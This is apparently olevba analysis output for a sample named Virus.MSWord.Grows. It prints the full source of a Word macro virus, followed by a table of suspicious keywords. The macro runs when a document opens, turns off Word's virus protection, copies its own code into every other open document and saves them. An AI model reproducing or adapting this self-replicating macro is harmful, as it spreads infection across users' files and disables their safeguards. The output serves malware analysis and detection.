olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Grows
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Grows - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
Options.VirusProtection = (((2 * 2) - 4) * 1000)
Options.ConfirmConversions = (((2 * 2) - 4) * 1000)
If Documents.Count > 1 Then
Open "Goat" For Output As #1
Print #1, ThisDocument.VBProject.VBComponents.Item(1).CodeModule. _
Lines(1, ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
Close #1
For X = 1 To Documents.Count
Set Blah = Documents.Item(X).VBProject.VBComponents.Item(1).CodeModule
Set Haha = Documents.Item(X).VBProject.VBComponents.Item(1).CodeModule
Blah.DeleteLines 1, Blah.CountOfLines
Haha.AddFromFile "Goat"
Documents.Item(X).SaveAs FileName:=Documents.Item(X).FullName
Next X
Kill "Goat"
If (Hour(Now)) = 18 Then MsgBox "Mrrr", vbOKOnly, "Goat"
End If
End Sub
'Lys Was Here
'Goat... Grows

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

